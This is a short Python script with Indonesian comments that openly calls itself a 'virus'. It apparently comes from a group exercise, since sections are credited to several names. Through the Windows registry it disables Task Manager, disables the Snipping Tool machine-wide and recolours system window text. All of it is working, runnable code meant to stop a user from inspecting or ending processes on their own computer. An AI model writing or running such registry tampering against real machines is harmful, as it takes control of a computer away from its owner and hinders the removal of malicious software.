##  Author : azronaftara ##
##  Created at : 2023 ##

# >>>> MEMATIKAN TASKMANAGER DI WINDOWS <<<< #

# mengimport module winreg dan membuat alias dari winreg menjadi reg
import winreg as reg

# membuat fungsi atau function untuk membuat virus yang diberi nama buat_virus
def create_virus(root_key, key_path, key_name, value_type ,value ):
    key = reg.CreateKey(root_key, key_path)
    reg.SetValueEx(key, key_name, 0, value_type, value)
    reg.CloseKey(key)

# membuat objek dari fungsi buat_virus yang sudah dibuat diatas
# 1. Mendisable Taskmanager
# Ahmad Zaeni Imron
virus1 = {
    'root_key': reg.HKEY_CURRENT_USER,
    'key_path': 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
    'key_name': 'DisableTaskMgr',
    'value_type': reg.REG_DWORD,
    'value': 1
}

# menjalankan fungsi buat_virus dan memecah setiap key yang ada di object virus1 untuk dijadikan parameter di fungsi buat_virus
create_virus(**virus1)

# Alin
key2 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'Control Panel\\Colors')
reg.SetValueEx(key2, 'WindowText', 0, reg.REG_SZ, "0 255 0")
reg.CloseKey(key2)

#fitri
key3 = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Policies\\Microsoft\\TabletPC')
reg.SetValueEx(key3, 'DisableSnippingTool', 0, reg.REG_DWORD, 1)
reg.CloseKey(key3)
